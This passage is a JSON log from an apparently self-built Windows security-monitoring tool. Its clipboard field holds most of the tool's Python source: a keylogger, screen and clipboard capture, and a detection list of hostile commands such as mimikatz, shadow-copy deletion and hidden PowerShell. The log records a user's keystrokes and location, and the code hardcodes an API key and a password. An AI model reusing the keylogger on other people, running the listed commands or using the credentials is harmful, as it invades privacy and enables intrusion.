items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "1a0ce3a8578890891bf2cc6952ac437b07aab6c94b972b446f6337d387ff74b0", "screenshot_hash": "131e7f3ca53564ec8c1fa8302a1b67065702ac80b545cdc964f21afd3bb6e44a", "_raw_log_hash": "06a6eed5b79ab617d86188bb8fc7698b850f947957d6510d7779b03c77a7009a"}
{"timestamp": "2025-06-23T09:30:16.980887+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "d14cdc62de70cf29ee645dc5b480ec7a5b880d3b0c05882dbd2522282b99ec8e", "keystrokes": "but honestly that feature on sk[BACKSPACE]nakey is it any good scanning sh[BACKSPACE][BACKSPACE]the screenshot hash[shift_r]?[ENTER][ctrl_l]\u0003[ctrl_l]\u0016 this please[ENTER][ctrl_l]\u0001\u0003[ctrl_l]\u0016[ENTER][BACKSPACE][ctrl_l]\u0003[ctrl_l]\u0016[ctrl_l]\u0001\u0003[ctrl_l]\u0016[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "1a0ce3a8578890891bf2cc6952ac437b07aab6c94b972b446f6337d387ff74b0", "screenshot_hash": "a6359b7101117e6eef2cb64fc12678638356c3c390d7809312a8b720923f039c", "_raw_log_hash": "0e60ae00de1f3e1414b66fda6d821976458feee839c53b41a5a7c43ade596369"}
{"timestamp": "2025-06-23T09:32:47.720710+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\nimport shutil\r\nimport traceback # Added for detailed error logging\r\n\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === New: Country Change and VPN/Proxy IP Detection Configuration ===\r\nlast_country_path = os.path.join(base_path, \"last_country.txt\") # Path to store last country\r\nKNOWN_VPN_IPS = {\"89.214.145.78\", \"123.45.67.89\"}  # Example IPs - Expand this list as needed!\r\n\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === Sensitive Command Detection Configuration ===\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\",  # Formatting drives\r\n    \"del /s /q\",  # Force delete (subdirectories, quiet)\r\n    \"rmdir /s /q\",  # Force remove directory (subdirectories, quiet)\r\n    \"net user\",  # User management (info or creation)\r\n    \"net localgroup administrators\",  # Admin group checks\r\n    \"taskkill /f /im\",  # Force kill process by image name\r\n    \"schtasks /create\",  # Create scheduled tasks (persistence)\r\n    \"reg delete\",  # Delete registry keys\r\n    \"mimikatz\",  # Credential dumping tool\r\n    \"certutil -urlcache -f -split\",  # Common technique for downloading files\r\n    \"wmic shadowcopy delete\",  # Delete volume shadow copies (often pre-ransomware)\r\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\r\n    \"powershell -nop -w hidden -c\",  # Common PowerShell obfuscation for execution\r\n    \"invoke-expression\",  # PowerShell alias for 'iex' - executes strings as commands\r\n    \"set-mppreference -disablerealtimemonitoring $true\",  # Disable Windows Defender\r\n    \"bcdedit /set {current} safeboot network\",  # Set network safe mode (persistence/bypass)\r\n    \"mshta.exe http\",  # HTML Application (often for remote code execution)\r\n    \"bitsadmin /transfer\",  # Download files via BITS\r\n    \"wevtutil cl system\",  # Clear event logs\r\n    \"cipher /w\",  # Overwrite free space (anti-forensics)\r\n    \"sdelete -z\",  # Secure delete tool\r\n]\r\n\r\n\r\n# === Logging Function ===\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())  # Also print to console for immediate feedback\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())  # Still print even if file write fails\r\n\r\n\r\n# === Encryption Key Loading ===\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    # Use verify=False here as well, consistent with Elasticsearch client config\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                            verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    # Read a byte to force connection establishment, then close to prevent hanging\r\n    try:\r\n        response.raw.read(1)\r\n    except Exception as read_e:\r\n        log_daemon_message(\"WARNING\", f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\")\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n    traceback.print_exc() # <-- Added traceback\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # This disables SSL certificate verification\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\")\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\r\n        return None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        if not os.path.exists(file_path):\r\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:  # If hashing failed\r\n            return {}\r\n\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            # Ensure timestamp is ISO format for Elasticsearch\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty before sending for Kibana visualization\r\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []  # Ensure it's an empty list if no alerts\r\n\r\n            log_daemon_message(\"DEBUG\",\r\n                               f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n            traceback.print_exc()\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n            traceback.print_exc()\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n            traceback.print_exc() # <-- Added traceback\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n            traceback.print_exc() # <-- Added traceback\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n\r\n# === Analyze Clipboard for Sensitive Commands ===\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\r\n    \"\"\"\r\n    Analyzes clipboard content for predefined sensitive command patterns.\r\n    Adds alerts to the alerts_list if matches are found.\r\n    \"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n\r\n\r\n    return alerts_list\r\n\r\n# === Check Country Change Function ===\r\ndef check_country_change(current_country, alerts_list):\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\") as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                log_daemon_message(\"ALERT\", f\"Country changed: {last_country} -> {current_country}\")\r\n        # Update the file for next session, even if it's the first run or country didn't change\r\n        with open(last_country_path, \"w\") as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to check/update last country: {e}\")\r\n    return alerts_list\r\n\r\n# === New: Check VPN/Proxy IP Function ===\r\ndef check_vpn_proxy_ip(current_ip, alerts_list):\r\n    \"\"\"\r\n    Checks if the current public IP is in a list of known VPN/proxy IPs.\r\n    \"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        log_daemon_message(\"ALERT\", f\"Access from known VPN/proxy IP detected: {current_ip}\")\r\n    return alerts_list\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session():\r\n    current_time = datetime.now(timezone.utc)  # consistent timestamping\r\n    session_log = {\r\n        \"timestamp\": current_time.isoformat(),  # consistent timestamp\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],  # This list will be populated\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip = None\r\n        current_country = None\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\") # Store for VPN check\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\") # Store for country change check\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n                log_daemon_message(\"ALERT\", f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n            # NEW: Check for country change\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n\r\n            # NEW: Check for known VPN/proxy IP\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n            # NEW: Analyze clipboard for sensitive commands\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_path = os.path.join(base_path, screenshot_information) # Define path here\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)  # Hash of screenshot image file\r\n\r\n            # VirusTotal Scan for screenshot\r\n            vt_result = vt_lookup_file(screenshot_path)\r\n            if vt_result:\r\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                if vt_result.get(\"malicious\", 0) > 0:\r\n                    session_log[\"alerts\"].append(\r\n                        f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                    log_daemon_message(\"ALERT\", f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\")\r\n            else:\r\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n        finally:\r\n            # Clean up the temporary screenshot file\r\n            if os.path.exists(screenshot_path):\r\n                try:\r\n                    os.remove(screenshot_path)\r\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\r\n                except Exception as e:\r\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    # Ensure clipboard is a string before checking .startswith()\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(\r\n                    f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                log_daemon_message(\"ALERT\", f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n        else:\r\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        nonlocal keys\r\n        try:\r\n            if hasattr(key, 'char') and key.char is not None:\r\n                keys.append(key.char)\r\n            elif key == Key.space:\r\n                keys.append(' ')\r\n            elif key == Key.enter:\r\n                keys.append('[ENTER]')\r\n            elif key == Key.backspace:\r\n                keys.append('[BACKSPACE]')\r\n            elif key == Key.tab:\r\n                keys.append('[TAB]')\r\n            else:\r\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running. Create 'stop_snakey.txt' to terminate earlier.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 143:  # Collect keystrokes for 2 mins and 23 secs\r\n                time.sleep(0.5)  # Sleep for shorter intervals to check stop file more often\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n            log_daemon_message(\"INFO\", \"Keylogger session completed.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\r\n        if listener:  # Attempt to stop listener cleanly even on error\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\r\n    if session_log[\"alerts\"] is None:\r\n        session_log[\"alerts\"] = []\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    # 1. Prepare the full log for encryption\r\n    # We will hash the raw JSON string content of the log *before* encryption\r\n    # This hash acts as an internal integrity check within the log itself\r\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)  # Store hash of raw log inside\r\n\r\n    # 2. Encrypt the entire session log\r\n    try:\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file\r\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\r\n            f_enc.write(encrypted_log_data)\r\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\r\n            return session_log  # Exit without updating ledger for this log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\") as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed\r\n                    if ledger and isinstance(ledger[0], str):  # Check if old format (list of hashes)\r\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": current_time.isoformat(),\r\n                                # Cannot determine true timestamp for old entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\r\n                except json.JSONDecodeError:\r\n                    